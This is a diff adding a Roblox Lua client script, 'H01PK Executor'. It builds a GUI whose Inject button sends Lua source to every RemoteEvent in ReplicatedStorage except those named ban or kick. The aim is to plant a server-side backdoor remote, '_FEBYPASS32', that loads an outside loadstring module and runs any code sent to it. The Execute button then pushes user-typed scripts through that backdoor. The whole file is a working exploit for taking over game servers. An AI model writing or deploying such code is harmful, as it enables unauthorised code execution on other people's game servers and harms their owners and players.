@@ -1,0 +1,127 @@
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local gui = Instance.new("ScreenGui", playerGui)
+gui.Name = "H01PKExecutorGUI"
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 500, 0, 300)
+frame.Position = UDim2.new(0.5, -250, 0.5, -150)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 47)
+frame.Active = true
+frame.Draggable = true
+
+local title = Instance.new("TextLabel", frame)
+title.Text = "H01PK Executor"
+title.Size = UDim2.new(1, 0, 0, 30)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundColor3 = Color3.fromRGB(46, 46, 63)
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 18
+
+local rightFrame = Instance.new("Frame", frame)
+rightFrame.Size = UDim2.new(0.7, 0, 1, -40)
+rightFrame.Position = UDim2.new(0.3, 0, 0, 40)
+rightFrame.BackgroundColor3 = Color3.fromRGB(46, 46, 63)
+rightFrame.BorderSizePixel = 0
+
+local textBox = Instance.new("TextBox", rightFrame)
+textBox.Size = UDim2.new(0.9, 0, 0.8, 0)
+textBox.Position = UDim2.new(0.05, 0, 0.1, 0)
+textBox.BackgroundColor3 = Color3.fromRGB(62, 62, 79)
+textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox.Font = Enum.Font.SourceSans
+textBox.TextSize = 14
+textBox.TextWrapped = true
+textBox.PlaceholderText = "Enter script here..."
+
+local leftFrame = Instance.new("Frame", frame)
+leftFrame.Size = UDim2.new(0.3, 0, 1, -40)
+leftFrame.Position = UDim2.new(0, 0, 0, 40)
+leftFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 47)
+leftFrame.BorderSizePixel = 0
+
+local executeButton = Instance.new("TextButton", leftFrame)
+executeButton.Text = "Execute"
+executeButton.Size = UDim2.new(0.8, 0, 0, 40)
+executeButton.Position = UDim2.new(0.1, 0, 0.2, 0)
+executeButton.BackgroundColor3 = Color3.fromRGB(46, 46, 63)
+executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+executeButton.Font = Enum.Font.SourceSansBold
+executeButton.TextSize = 14
+
+local clearButton = Instance.new("TextButton", leftFrame)
+clearButton.Text = "Clear"
+clearButton.Size = UDim2.new(0.8, 0, 0, 40)
+clearButton.Position = UDim2.new(0.1, 0, 0.5, 0)
+clearButton.BackgroundColor3 = Color3.fromRGB(46, 46, 63)
+clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+clearButton.Font = Enum.Font.SourceSansBold
+clearButton.TextSize = 14
+
+local injectButton = Instance.new("TextButton", leftFrame)
+injectButton.Text = "Inject"
+injectButton.Size = UDim2.new(0.8, 0, 0, 40)
+injectButton.Position = UDim2.new(0.1, 0, 0.8, 0)
+injectButton.BackgroundColor3 = Color3.fromRGB(46, 46, 63)
+injectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+injectButton.Font = Enum.Font.SourceSansBold
+injectButton.TextSize = 14
+
+executeButton.MouseButton1Click:Connect(function()
+    if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+        local scriptText = textBox.Text
+        if scriptText and scriptText ~= "" then
+            local success, err = pcall(function()
+                game:GetService("JointsService")._FEBYPASS32:FireServer(scriptText)
+                print("Script executed successfully!")
+            end)
+            if not success then
+                warn("Execution Error: " .. err)
+            end
+        else
+            warn("Script is empty!")
+        end
+    else
+        warn("_FEBYPASS32 NOT FOUND, Please inject I love you -Yaazkidd")
+    end
+end)
+
+clearButton.MouseButton1Click:Connect(function()
+    textBox.Text = ""
+end)
+
+injectButton.MouseButton1Click:Connect(function()
+    local function b_G_V12(see)
+        local a = function(ree)
+            ree:FireServer([[
+                local folder = Instance.new('RemoteEvent')
+                folder.Name = "_FEBYPASS32"
+                folder.Parent = game:GetService("JointsService")
+                local loadstring = require(13684410229)
+                folder.OnServerEvent:Connect(function(_1,_2)
+                    loadstring(_2)()
+                end)
+            ]])
+        end
+        for i, v in pairs(see:GetChildren()) do
+            if v:IsA("RemoteEvent") then
+                if not string.match(string.lower(v.Name), "ban") then
+                    if not string.match(string.lower(v.Name), "kick") then
+                        a(v)
+                    end
+                end
+            end
+            b_G_V12(v)
+        end
+    end
+    local Inject = b_G_V12(game:GetService("ReplicatedStorage"))
+    local timetoken = 0
+    local maxtime = 5
+    repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
+    if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+        injectButton.Text = "Injected"
+        injectButton.BackgroundColor3 = Color3.fromRGB(46, 46, 63)
+    end
+end)
